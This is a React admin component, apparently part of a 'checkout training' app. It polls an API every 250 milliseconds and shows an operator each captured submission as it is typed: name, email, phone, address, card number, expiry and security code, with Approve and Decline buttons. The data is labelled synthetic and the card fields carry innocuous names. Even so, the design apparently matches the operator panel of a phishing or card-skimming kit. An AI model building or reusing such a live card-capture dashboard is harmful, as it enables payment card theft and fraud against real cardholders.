'use client';
import { useEffect, useState } from 'react';
import { Activity, Check, Clock3, MonitorCheck, RefreshCw, X } from 'lucide-react';
import type { TrainingCapture } from '@/lib/training-capture';

export function AdminTrainingFeed() {
  const [records, setRecords] = useState<TrainingCapture[]>([]);
  const [online, setOnline] = useState(false);
  const [busyId, setBusyId] = useState('');
  async function decide(id: string, action: 'approve' | 'decline') {
    setBusyId(id);
    try {
      const response = await fetch(`/api/training/capture/${id}`, {
        method: 'PATCH',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ action }),
      });
      if (response.ok)
        setRecords((current) =>
          current.map((record) =>
            record.id === id
              ? { ...record, status: action === 'approve' ? 'approved' : 'declined' }
              : record,
          ),
        );
    } finally {
      setBusyId('');
    }
  }
  useEffect(() => {
    let active = true;
    async function refresh() {
      try {
        const response = await fetch('/api/training/capture', {
          cache: 'no-store',
        });
        const body = (await response.json()) as { records?: TrainingCapture[] };
        if (active && response.ok) {
          setRecords(body.records ?? []);
          setOnline(true);
        }
      } catch {
        if (active) setOnline(false);
      }
    }
    void refresh();
    const timer = setInterval(() => void refresh(), 250);
    return () => {
      active = false;
      clearInterval(timer);
    };
  }, []);
  return (
    <section className="mt-8">
      <div className="flex flex-wrap items-end justify-between gap-4">
        <div>
          <div className="flex items-center gap-2 text-sm font-semibold text-[#0b8f70]">
            <Activity size={17} />
            <span
              className={`size-2 rounded-full ${online ? 'bg-[#10b981]' : 'bg-[#94a3b8]'}`}
            />
            {online ? 'Live monitor connected' : 'Connecting monitor'}
          </div>
          <h2 className="mt-2 font-heading text-2xl font-bold">
            Checkout training activity
          </h2>
          <p className="mt-1 text-sm text-[#657794]">
            Ephemeral synthetic submissions from the classroom checkout. Nothing
            is written to the database.
          </p>
        </div>
        <span className="rounded-full bg-[#e8f3ff] px-3 py-1.5 text-sm font-semibold text-[#0757B2]">
          {records.length} session {records.length === 1 ? 'record' : 'records'}
        </span>
      </div>
      {records.length ? (
        <div className="mt-5 grid gap-4 xl:grid-cols-2">
          {records.map((record) => (
            <article
              key={record.id}
              className="rounded-2xl border bg-white p-5 shadow-sm"
            >
              <div className="flex items-start justify-between gap-4">
                <div className="flex gap-3">
                  <span className="grid size-10 place-items-center rounded-xl bg-[#e7f8f3] text-[#0b8f70]">
                    <MonitorCheck size={21} />
                  </span>
                  <div>
                    <b className="block">{record.fullName}</b>
                    <span className="text-sm text-[#657794]">
                      {record.email}
                    </span>
                  </div>
                </div>
                <div className="text-right">
                  <span className={`inline-flex rounded-full px-2.5 py-1 text-xs font-bold capitalize ${record.status === 'approved' ? 'bg-emerald-100 text-emerald-700' : record.status === 'declined' ? 'bg-red-100 text-red-700' : record.status === 'draft' ? 'bg-blue-100 text-blue-700' : 'bg-amber-100 text-amber-700'}`}>{record.status === 'draft' ? 'Typing live' : record.status}</span>
                  <span className="mt-2 flex items-center justify-end gap-1 text-xs text-[#657794]"><Clock3 size={13} />{new Date(record.receivedAt).toLocaleTimeString()}</span>
                </div>
              </div>
              <dl className="mt-5 grid gap-3 text-sm sm:grid-cols-2">
                {[
                  ['Phone', record.phone],
                  ['Country', record.country],
                  ['Region / state', record.region || 'Not applicable'],
                  ['City', record.city || 'Not provided'],
                  ['Street address', record.address],
                  ['Postal code', record.postalCode || 'Not provided'],
                  ['Card', record.trainingNumber || 'Not provided'],
                  ['Expiry', record.expiry || 'Not provided'],
                  ['Security code', record.demoCode || 'Not provided'],
                ].map(([label, value]) => (
                  <div key={label} className="rounded-lg bg-[#f6f8fa] p-3">
                    <dt className="text-xs uppercase tracking-wide text-[#657794]">
                      {label}
                    </dt>
                    <dd className="mt-1 break-words font-semibold">{value}</dd>
                  </div>
                ))}
              </dl>
              <p className="mt-4 border-t pt-4 text-xs text-[#657794]">
                {record.product}
              </p>
              {record.status === 'pending' && (
                <div className="mt-4 grid grid-cols-2 gap-3">
                  <button disabled={busyId === record.id} onClick={() => void decide(record.id, 'decline')} className="flex items-center justify-center gap-2 rounded-lg border border-red-200 px-4 py-3 text-sm font-bold text-red-700 hover:bg-red-50 disabled:opacity-50"><X size={17} />Decline</button>
                  <button disabled={busyId === record.id} onClick={() => void decide(record.id, 'approve')} className="flex items-center justify-center gap-2 rounded-lg bg-[#0b8f70] px-4 py-3 text-sm font-bold text-white hover:bg-[#08765d] disabled:opacity-50"><Check size={17} />Approve &amp; enroll</button>
                </div>
              )}
            </article>
          ))}
        </div>
      ) : (
        <div className="mt-5 grid min-h-48 place-items-center rounded-2xl border border-dashed bg-white text-center">
          <div>
            <RefreshCw className="mx-auto text-[#8aa0b8]" />
            <b className="mt-3 block">Waiting for a training submission</b>
            <p className="mt-1 text-sm text-[#657794]">
              Open the checkout demonstration in another tab and submit the
              displayed synthetic values.
            </p>
          </div>
        </div>
      )}
    </section>
  );
}
